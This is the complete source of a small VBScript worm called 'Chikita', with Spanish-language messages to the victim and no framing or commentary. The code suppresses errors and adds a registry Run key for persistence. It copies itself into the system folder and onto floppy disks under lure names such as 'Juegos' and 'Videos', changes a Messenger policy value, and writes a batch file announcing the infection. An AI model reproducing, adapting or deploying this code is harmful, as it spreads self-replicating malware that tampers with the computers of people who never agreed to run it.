On Error Resume Next
Set File = CreateObject("scripting.filesystemobject")
Set regedit = CreateObject("WScript.Shell")
Set Sys = File.GetSpecialFolder(1)

Set reg = regedit.regwrite("HKLM\Software\Microsoft\Windows\Run\Chikita", Sys & "\Chikita.vbs")
Set reg = regedit.regwrite("HKLM\Software\Microsoft\MessengerService\Policies\IMWarning","Messenger crackeado por Chikita :)")

Randomize
Num = Int((Rnd * 4) + 1)
If Num = 1 Then Nombre = "Juegos"
If Num = 2 Then Nombre = "Chistes"
If Num = 3 Then Nombre = "Videos"
If Num = 4 Then Nombre = "Chikita"

File.CopyFile wscript.scriptFullName, "A:\" & Nombre & ".vbs"
File.CopyFile wscript.scriptFullName, Sys & "\Chikita.vbs"

Set Bat = File.CreateTextFile("C:\Chikita", True)
Bat.WriteLine("@echo off")
Bat.WriteLine("echo.Lo siento mucho pero estas infectado con el virus Chikita")
Bat.WriteLine("echo.Este virus no destruye ningun tipo de archivo ni formatea el PC")
Bat.WriteLine("echo.")
Bat.WriteLine("echo.Este virus solo ha sido creado con el unico fin de expandirse")
Bat.WriteLine("echo.Si tienes algun diskete en el PC, el virus se abra copiado en el.")
Bat.WriteLine("echo.")
Bat.WriteLine("pause")
Bat.WriteLine("cls")
Bat.WriteLine("echo.Gracias por tu colaboracion. Adios")
Bat.WriteLine("echo.")
Bat.WriteLine("echo.Un besito, de parte de Chikita")
Bat.Close

